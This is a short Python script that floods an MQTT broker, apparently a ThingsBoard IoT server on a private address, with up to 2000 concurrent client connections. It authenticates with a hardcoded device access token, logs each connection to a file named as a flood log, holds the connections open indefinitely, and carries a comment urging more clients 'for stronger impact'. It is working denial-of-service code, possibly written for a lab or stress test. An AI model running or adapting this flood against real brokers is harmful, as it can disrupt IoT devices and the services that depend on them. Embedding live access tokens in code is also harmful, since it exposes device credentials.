import paho.mqtt.client as mqtt
import time
import csv
from datetime import datetime

# Configuration
TARGET_IP = "192.168.3.40"
TARGET_PORT = 1883
ACCESS_TOKEN = "REgDA8SV2zZVFnMHjVEf"  # Replace with your ThingsBoard device access token
CLIENT_COUNT = 2000  # Increase for stronger impact
LOG_FILE = "mqtt_flood_log.csv"

clients = []

# Setup CSV logging
with open(LOG_FILE, "w", newline="") as file:
    writer = csv.writer(file)
    writer.writerow(["Timestamp", "Client ID", "Status"])

def on_connect(client, userdata, flags, reason_code, properties=None):
    status = "Connected" if reason_code == 0 else f"Failed (Code: {reason_code})"
    with open(LOG_FILE, "a", newline="") as file:
        writer = csv.writer(file)
        writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), client._client_id.decode(), status])

def create_client(client_id):
    client = mqtt.Client(client_id=f"test_{client_id}", protocol=mqtt.MQTTv5)
    client.username_pw_set(username=ACCESS_TOKEN)
    client.on_connect = on_connect
    try:
        client.connect(TARGET_IP, TARGET_PORT, 60)
        client.loop_start()
        return client
    except Exception as e:
        with open(LOG_FILE, "a", newline="") as file:
            writer = csv.writer(file)
            writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), client_id, f"Error: {e}"])
        return None

# Create multiple MQTT clients
print(f"[+] Creating {CLIENT_COUNT} MQTT clients...")
for i in range(CLIENT_COUNT):
    client = create_client(i)
    if client:
        clients.append(client)
    else:
        print(f"[-] Client {i} failed to connect.")
    time.sleep(0.01)  # Prevent overwhelming local system

# Keep clients alive
print("[+] Maintaining connections...")
while True:
    time.sleep(10)